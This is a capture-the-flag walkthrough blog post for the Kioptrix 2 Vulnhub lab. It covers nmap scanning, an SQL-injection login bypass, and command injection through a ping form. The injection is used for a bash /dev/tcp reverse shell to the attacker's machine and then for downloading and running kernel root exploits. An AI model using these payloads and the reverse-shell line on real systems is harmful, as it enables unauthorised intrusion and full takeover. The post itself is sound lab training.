---
layout: post
title: "Kioptrix 2 walkthrough (Vulnhub)"
permalink: ctf-writeup/kioptrix-2
author: xscorp
tags: [CTF Walkthrough]
categories: [CTF Walkthrough]
image:
    path: /assets/img/nk/image-23.png
---
Hello my fellow hackers! Today we are going to do the [Kioptrix 1.1 (#2)](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) machine from vulnhub. I am assuming that you have already set it up on virtual box/vmware or any other virtual environment and it's running. If you haven't done it yet, I will recommend you to search Google to do that.

First of all, before testing anything, we must be knowing the IP of the target machine. To obtain that, we need to use the **Netdiscover** tool. The netdiscover tool can scan IP range for connected hosts. I have used class C addresses for my host and guest machines, so the IP will be of the form 192.168.xx.xx

To pass the IP range/network IP to netdiscover, we can use **-r** option.
    
    
    # netdiscover -r 192.168.43.0/24

![](/assets/img/nk/image-23.png)Output of netdiscover command

As you can see that it listed two connected devices. First one belongs to the router itself while the second one is of the target system. I have hidden the MAC addresses for security reasons.

Now we have got the IP of the target system, now it's time for enumeration. We will do an nmap scan for port scanning. I used the following command for port scanning through nmap.
    
    
    # nmap -sS -sC -sV  -A -p- 192.168.43.239 -oN nmap.txt

It requires a bit explanation! The **-sS** flag is used for **TCP SYN scan**. **-sC** is used for using **default NSE scripts**, **-sV** is used for **version detection**, **-A **for **banner grabbing**, **-p- **for **scanning all ports**. Following our target IP, the last flag **-oN ** is for **output in normal text form** and the file name is supplied as an argument to the flag. I have marked the ports with red color
    
    
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-23 06:20 EDT
    Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.79% done; ETC: 06:21 (0:00:00 remaining)
    Nmap scan report for 192.168.43.239
    Host is up (0.00019s latency).
    Not shown: 65528 closed ports
    PORT     STATE SERVICE    VERSION
    **22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)**
    | ssh-hostkey: 
    |   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
    |   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
    |_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
    |_sshv1: Server supports SSHv1
    **80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))**
    |_http-server-header: Apache/2.0.52 (CentOS)
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    **111/tcp  open  rpcbind    2 (RPC #100000)**
    | rpcinfo: 
    |   program version   port/proto  service
    |   100000  2            111/tcp  rpcbind
    |   100000  2            111/udp  rpcbind
    |   100024  1            600/udp  status
    |_  100024  1            603/tcp  status
    **443/tcp  open  ssl/https?**
    |_ssl-date: 2019-05-23T14:20:51+00:00; +3h59m58s from scanner time.
    | sslv2: 
    |   SSLv2 supported
    |   ciphers: 
    |     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
    |     SSL2_DES_64_CBC_WITH_MD5
    |     SSL2_DES_192_EDE3_CBC_WITH_MD5
    |     SSL2_RC4_64_WITH_MD5
    |     SSL2_RC4_128_EXPORT40_WITH_MD5
    |     SSL2_RC2_128_CBC_WITH_MD5
    |_    SSL2_RC4_128_WITH_MD5
    **603/tcp  open  status     1 (RPC #100024)**
    **631/tcp  open  ipp        CUPS 1.1**
    | http-methods: 
    |_  Potentially risky methods: PUT
    |_http-server-header: CUPS/1.1
    |_http-title: 403 Forbidden
    **3306/tcp open  mysql      MySQL (unauthorized)**
    MAC Address: 08:00:27:9E:70:47 (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.9 - 2.6.30
    Network Distance: 1 hop
    
    Host script results:
    |_clock-skew: mean: 3h59m57s, deviation: 0s, median: 3h59m57s
    
    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.19 ms 192.168.43.239
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 108.49 seconds
    

No matter what the open ports are, it is always a good approach to look at the port 80(or I should say, the main web page). So let's jump to the webpage. 

When you visit the main page, it will greet you with this authentication form.

![](/assets/img/nk/image-25.png)authentication form on the main webpage

After making a lot of failed attempts trying to log in with silly credentials like "admin:pass", I decided to test it for SQL injection. Luckily, that was present there. 

![](/assets/img/nk/image-27.png)trying basic SQL injection on form

Now the payload(malicious input) I gave requires a bit explanation. What this payload is doing is that it first closes the previous query using a single quote(**'**). Once that query is closed we give such a query as input that will always result in "True". Here, that query is **'1=1'**. It's a common sense that **1 is equal to 1** will always yield to "True" result. Isn't it?   
That **or** is placed between the two queries so that the whole query can evaluate to "True" if there is at least one query among both which yields "True". As we know '1=1' will always yield to "True", hence the whole query will always evaluate to **True** no matter what. That **#(hash) **sign is used for specifying a comment. This sign has a special meaning in SQL. It is used for writing comments. Hence, here, whatever query will be there after it, It will be ignored due to the presence of **#** before them. This will lead to the entire SQL authentication process yielding to **True **and we will logged in.

After the authentication process is now complete, we are presented with the following on the next page.

![](/assets/img/nk/image-28.png)

As this page says, we can ping whatever IP we want from here. Let's first test it with localhost IP.

![](/assets/img/nk/image-30.png)testing ping box for localhost IP

It produced the following output on a new tab:

![](/assets/img/nk/image-31.png)output of ping box for localhost IP

It works! But the output looks familiar. That's what the output of **ping -c 3 127.0.0.1** looks like. Don't believe me? See for yourself:

![](/assets/img/nk/image-33.png)

What can you derive from this behavior of that "ping box"? It is that it is using a syntax which looks like this from inside:
    
    
    $ ping -c 3 _<entered_IP_address>_

That <entered_IP_address> is controlled by us. That means we could somehow manipulate the command execution by passing some specially crafted payload(malicious input). What if I pass this in place of IP address.

$ ping -c 3 **127.0.0.1; whoami**

According to this approach, first the ping tool will ping the localhost address. But the **whoami** will be executed as an independent command due to that semicolon(;) placed before it which will end the previous command.  
Let's test this payload in the "ping box".

![](/assets/img/nk/image-34.png)testing the payload ![](/assets/img/nk/image-36.png)

Did you notice something? If not, then look at the last line of the output highlighted with red box. That **whoami **command we gave actually got executed. Yay, that means we have arbitrary code injection. Now the first thing an attacker generally does after discovering such a command injection vulnerability is to try to get a reverse shell using netcat. I tried the same but it didn't helped. The reason behind that was **either the netcat isn't installed on the target system **or **the current user(apache) does not have permission to execute it**. So we have to look somewhere else. 

So I set up a netcat server listening on my attack machine and executed this command in the ping box for getting a reverse shell. I got this from [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

bash -i >& /dev/tcp/_attacker's_IP**/**port_no_ 0>&1 

I placed my attack machine's IP in place of _attacker's_IP _and desired_ _port in place of _port_no_ so that It can connect to my host. But before executing it, I had to create a netcat server to receive that connection and get a reverse shell.

![](/assets/img/nk/image-38.png) ![](/assets/img/nk/image-39.png)

We got a shell! Yay!

Now it's time for privilege escalation. Let's see some information about the operating system and kernel. We can do this by using the command **uname **or **lsb_release**. 

![](/assets/img/nk/image-40.png)

I want you to notice few things in the output. The first is that it's using **Linux kernel 2.6.X** and The operating system it operates on is **CentOS 4.5**.   
Now If you are an experienced pentester, you might be aware of that Linux kernels 2.6.X are vulnerable to **Dirty Cow exploit**. After trying couple of Dirty Cow exploits, I discovered that this vulnerability has been already patched by the maker of the box. So we can't use dirty cow exploit here. But we can use that CentOS version information to find exploits related to it.  
Let's google!

![](/assets/img/nk/image-41.png)

Let's download this exploit in vulnerable machine and compile it. To download it on victim machine, I used the **wget **tool. 
    
    
    bash-3.00$ wget --no-check-certificate https://www.exploit-db.com/download/9542

That **\--no-check-certificate **is used to deal with SSL certificate exchange issue. Sometimes this command doesn't work as intended. In that case, simple copy the exploit code from the website and create a file in vicitim OS, paste the code there and compile it manually.   
But, while doing so, you will find that you don't have write permissions on the directory. Then how to create a file? Here, you can use the **/tmp** directory as it is writable for all. Just navigate to /tmp and create the file.

Once the exploit code file is there, compile it using the following command:
    
    
    bash-3.00$ gcc 9542.c -o exploit

What this command does is that It gives instruction to **GCC(GNU C Compiler) **to compile the code and generate an executable file named **exploit**.

Now the code is compiled and it's showtime. Let's fire up our exploit and see if we get root or not.
    
    
    bash-3.00$ ./exploit

![](/assets/img/nk/image-42.png)

Hurrey!  
"Alright Jack, I have gained root access to the remote system!"

Wait wait wait! There is another exploit which we can use here to get root. Remember what kernel version was that?

Let's find some exploits for it other than Dirty Cow. I will use **searchsploit **exploit finder tool for that.
    
    
    # searchsploit Linux kernel 2.6

After running this command, I found a lot of exploits related to this kernel version.

![](/assets/img/nk/image-43.png)

I found the highlighted one more interesting as **CentOS**(which is our target host) is explicitly written there in the name of exploit. That means it must be compatible with CentOS machines. There's nothing bad in giving it a try. Let's download it and put this exploit code into vicitim machine(I have already told you how to do that). 

To download an exploit code from **searchsploit**, simply use the mirror flag (**-m**) which mirrors the exploit code into the current directory.
    
    
    # searchsploit -m exploits/linux/local/9545.c

![](/assets/img/nk/image-45.png)  


After downloading and uploading the exploit code into victim machine, open the file and check the comments for compilation instructions. It is mentioned there that we need to use an extra flag **-Wall **during the compilation for the correct working of exploit.
    
    
    bash-3.00$ gcc -Wall linux-sendpage.c -o linux-sendpage

Now everything is set, let's launch the exploit!
    
    
    bash-3.00$ ./linux-sendpage

![](/assets/img/nk/image-46.png)

And here it is! We are root! 

I won't show flags so that you guys can try this box to find that out. Thanks for giving it a read!   
Happy Hacking! 
